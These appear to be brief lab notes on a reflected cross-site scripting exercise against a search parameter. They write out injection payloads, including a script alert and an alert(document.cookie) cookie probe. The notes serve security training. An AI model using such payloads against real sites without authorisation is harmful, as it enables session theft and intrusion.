Purpose: Lab: Reflected XSS into HTML context with nothing encoded

Goal: if Web App is vulnerable to Cross-site scripting

Analysis:
Step 1: check if form input is reflected as output
?search=Flower
I get output of input field displayed

Step 2: check if html tag is interpreted by browser
?search=<h1>Flower</h1>

Step 3: Highly likely that web app is vulnerable to XSS
?search=<script>alert('Flower')</script>
get the pop up alert

(Not part of this lab1)
Step 4:
?search=<script>alert(document.cookie)</script>
